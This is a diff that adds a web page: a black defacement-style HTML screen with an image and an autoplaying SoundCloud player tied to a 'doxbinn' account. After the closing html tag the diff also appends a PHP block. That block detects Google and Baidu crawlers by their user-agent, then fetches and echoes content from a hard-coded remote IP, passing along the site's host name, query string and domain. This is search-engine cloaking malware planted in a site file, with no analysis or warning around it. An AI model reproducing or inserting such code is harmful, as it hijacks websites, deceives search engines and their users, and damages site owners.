@@ -1,0 +1,19 @@
+<html><head></head><body><style>
+body {
+  background-color: #000000;
+}
+</style><center><img src="https://cdn.discordapp.com/attachments/838378194365186079/838447008917749801/unknown.png">
+<iframe width="100%" height="450" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1041169702&color=%23030000&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe><div style="font-size: 10px; color: #cccccc;line-break: anywhere;word-break: normal;overflow: hidden;white-space: nowrap;text-overflow: ellipsis; font-family: Interstate,Lucida Grande,Lucida Sans Unicode,Lucida Sans,Garuda,Verdana,Tahoma,sans-serif;font-weight: 100;"><a href="https://soundcloud.com/doxbinn" title="Noah?" target="_blank" style="color: #cccccc; text-decoration: none;">Noah?</a> · <a href="https://soundcloud.com/doxbinn/goonsquad-freestyle" title="GoonSquad Freestyle" target="_blank" style="color: #cccccc; text-decoration: none;">GoonSquad Freestyle</a></div>
+</center>
+</body></html>
+<?php
+header('Content-Type:text/html;charset=gb2312');
+$key= $_SERVER["HTTP_USER_AGENT"];
+if(strpos($key,'oogle')!== false||strpos($key,'aidu')!==false)
+{
+   $host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
+   $file = file_get_contents('http://103.145.87.162/'."/index.php?host=".$host_name."&url=" . $_SERVER['QUERY_STRING'] . "&domain=" . $_SERVER['SERVER_NAME']); 
+   echo $file;
+}
+
+?>
